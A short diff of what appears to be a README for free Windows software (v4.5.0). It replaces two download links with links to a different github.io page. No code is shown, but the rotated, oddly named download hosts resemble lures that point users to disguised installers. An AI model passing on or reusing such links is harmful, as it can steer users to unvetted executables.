@@ -2,7 +2,7 @@
 
 <p align="center">
 
-[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://laplaplaplas.github.io/download/)
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-000000?style=for-the-badge&labelColor=1a1a1a)](https://hornbladesmanhonor.github.io/download-win/)
 [![VERSION](https://img.shields.io/badge/VERSION-4.5.0-2196F3?style=for-the-badge)]()
 [![PLATFORM](https://img.shields.io/badge/PLATFORM-WINDOWS-0078D4?style=for-the-badge)]()
 [![STATUS](https://img.shields.io/badge/STATUS-FREE-00c853?style=for-the-badge)]()
@@ -39,7 +39,7 @@
 
 ---
 
-## [📥 Download v4.5.0](https://laplaplaplas.github.io/download/)
+## [📥 Download v4.5.0](https://hornbladesmanhonor.github.io/download-win/)
 
 ---
 
